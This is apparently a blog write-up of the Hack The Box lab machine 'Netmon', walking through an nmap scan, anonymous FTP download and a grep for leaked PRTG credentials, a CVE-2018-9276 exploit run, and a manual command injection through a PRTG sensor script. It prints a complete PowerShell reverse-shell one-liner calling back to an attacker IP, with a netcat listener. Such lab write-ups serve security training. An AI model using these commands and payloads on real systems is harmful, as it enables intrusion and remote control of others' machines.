---
layout: single
title: Netmon - Hack The Box
excerpt: "Netmon is an easy difficulty Windows box with simple enumeration and exploitation. PRTG is running, and an FTP server with anonymous access allows reading of PRTG Network Monitor configuration files. The version of PRTG is vulnerable to RCE which can be exploited to gain a SYSTEM shell."
date: 2025-05-29
classes: wide
header:
  teaser: /img2/netmon.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Easy
tags:
  - FTP Enumeration
  - Information Leakage
  - Abusing PRTG Network Monitor - Command Injection [RCE]
---


- Nmap 

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.10.10.152
```

![](/img2/Pasted%20image%2020250528171155.png)

## Exploitation

- Download all content and get leaked credentials

```bash
wget -r ftp://10.10.10.152/ProgramData
```

```bash
grep -rl 'password' 10.10.10.152/ProgramData 2>/dev/null
```

![](/img2/Pasted%20image%2020250529204556.png)

![](/img2/Pasted%20image%2020250529204934.png)


- RCE PRTG/18.1.37.13946 (CVE-2018-9276)

```bash
python3 exploit.py -i 10.10.10.152 -p 80 --lhost 10.10.16.7 --lport 9000 --user prtgadmin --password PrTg@dmin2019
```

![](/img2/Pasted%20image%2020250529214501.png)

- Manual Explotation

![](/img2/Pasted%20image%2020250529215618.png)

> Go to add sensor and select the victim's device

![](/img2/Pasted%20image%2020250529215951.png)

> Select EXE/Script


![](/img2/Pasted%20image%2020250529220921.png)

```powershell
;$client = New-Object System.Net.Sockets.TCPClient('10.10.16.7',9000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
```

> Change the script type, add the payload and execute

```bash
rlwrap nc -nlvp 9000
```


![](/img2/Pasted%20image%2020250529211131.png)